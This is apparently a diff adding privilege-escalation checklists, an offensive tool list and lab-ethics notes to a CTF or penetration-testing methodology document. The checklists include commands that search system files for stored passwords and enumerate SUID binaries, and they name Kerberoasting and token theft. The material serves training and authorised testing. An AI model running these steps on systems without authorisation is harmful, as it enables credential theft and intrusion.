+## 6. Privilege escalation (ordered checklists)
+
+Principle: escalate using the least destructive, highest-leverage method first. Document every step.
+
+6.1 Linux checklist (order to try)
+1. `whoami`, `id`, `sudo -l` (check sudo rules)
+2. Search for credentials in home, webroot, config files: `grep -R "password" /var/www /home /etc 2>/dev/null`
+3. SUID binaries: `find / -perm -4000 -type f 2>/dev/null`
+4. Writable files/scripts run by root (cron, /etc/cron.*, systemd unit files)
+5. World-writable directories and PATH issues
+6. File capabilities: `getcap -r / 2>/dev/null`
+7. Docker / container checks: `cat /.dockerenv`, `ls -la /var/run/docker.sock`
+8. Kernel exploits (last resort) — match kernel version to public CVEs carefully
+
+6.2 Windows checklist (order to try)
+1. `whoami /priv`, `systeminfo`, check patch level
+2. Service paths (unquoted service path) and writable service binaries
+3. Scheduled tasks that run as SYSTEM or admin
+4. Weak ACLs on files or registry keys
+5. Token impersonation (SeImpersonatePrivilege) and token theft
+6. AD-specific: AS-REP roast, Kerberoast, weak group policies
+
+---
+
+## 7. Tools & resources (authoritative list)
+
+Scanning & enumeration:
+- `nmap`, `masscan`, `enum4linux`, `ss`, `netstat`
+
+Web testing:
+- Burp Suite, `ffuf`, `gobuster`, `nikto`, `sqlmap`
+
+Exploitation & post-exploit:
+- `nc`, `socat`, `msfvenom` (sparingly), custom Python scripts
+- Enumeration scripts: `linPEAS`, `winPEAS`, `LinEnum`
+
+AD & Windows tools:
+- Impacket suite, `evil-winrm`, BloodHound, `kerbrute`, `hashcat`
+
+Reference resources:
+- Exploit-DB / searchsploit, GTFOBins, HackTricks, OWASP, PacketNotes
+
+---
+
+## 8. Notes, documentation & ethics
+
+- Keep consistent notes: commands, outputs, nmap results, screenshots where useful
+- Use source markers when merging content (e.g., `Merged from: checklist.md`) — I have preserved these in prior commits
+- Prefer manual validation over blindly running exploits
+- Follow lab/CTF rules: do not attempt persistence or destructive actions on shared infrastructure unless allowed
+
+---
+
+If you want, I can:
+- Add an internal TOC with anchors
+- Run a dedupe pass to remove near-duplicate lines (needs review)
+- Export this as a printable checklist or Obsidian-friendly note
+
+<!-- consolidated from process/*.md -->
+
+``` 
 - Note any obstacles or unexpected behaviors
 
 #### Tools Reference
